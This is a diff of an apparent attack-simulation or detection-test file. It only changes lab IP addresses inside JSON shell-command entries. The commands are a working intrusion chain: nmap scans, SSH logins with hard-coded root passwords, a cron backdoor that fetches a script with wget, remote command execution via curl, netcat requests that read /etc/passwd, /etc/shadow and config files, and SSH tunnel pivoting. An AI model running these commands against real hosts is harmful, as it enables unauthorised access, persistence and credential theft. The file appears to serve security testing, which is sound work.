@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "nmap -sS -p 22,80,443 172.21.0.20 && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'nmap -sS -p 22,80,443 172.22.0.20 2>&1'"
+        "command": "nmap -sS -p 22,80,443 192.168.20.30 && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'nmap -sS -p 22,80,443 192.168.30.40 2>&1'"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "echo 'ThisIsATestFile' > /tmp/malware.bin && curl http://172.21.0.20:8018/malware.bin -o /tmp/malware.bin"
+        "command": "echo 'ThisIsATestFile' > /tmp/malware.bin && curl http://192.168.20.30:8018/malware.bin -o /tmp/malware.bin"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+        "command": "curl --proxy http://192.168.20.30:8888 http://192.168.30.40"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"wget http://172.21.0.20/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"wget http://192.168.20.30/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh root@172.21.0.20 \"nmap localhost\""
+        "command": "sshpass -p 'RootPass123' ssh root@192.168.20.30 \"nmap localhost\""
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30"
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "dig @172.21.0.20 www.maliciousdomain.local +short"
+        "command": "dig @192.168.20.30 www.maliciousdomain.local +short"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -130,7 +130,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20:4444/ -s -o /tmp/resp; echo 'cat /etc/passwd' | nc -w 2 172.21.0.20 4545; echo 'cat /etc/shadow' | nc -w 2 172.21.0.20 4444; echo 'find / -type f -name \"*.conf\" -exec cat {} \\;' | nc -w 2 172.21.0.20 4444"
+        "command": "curl http://192.168.20.30:4444/ -s -o /tmp/resp; echo 'cat /etc/passwd' | nc -w 2 192.168.20.30 4545; echo 'cat /etc/shadow' | nc -w 2 192.168.20.30 4444; echo 'find / -type f -name \"*.conf\" -exec cat {} \\;' | nc -w 2 192.168.20.30 4444"
       }
     ]
   },
@@ -145,7 +145,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "fuser -k 2222/tcp 2>/dev/null; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L 2222:172.22.0.20:22 root@172.21.0.20 -N & TUNNEL_PID=$!; sleep 5; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p 2222 id; kill $TUNNEL_PID"
+        "command": "fuser -k 2222/tcp 2>/dev/null; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L 2222:192.168.30.40:22 root@192.168.20.30 -N & TUNNEL_PID=$!; sleep 5; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p 2222 id; kill $TUNNEL_PID"
       }
     ]
   },
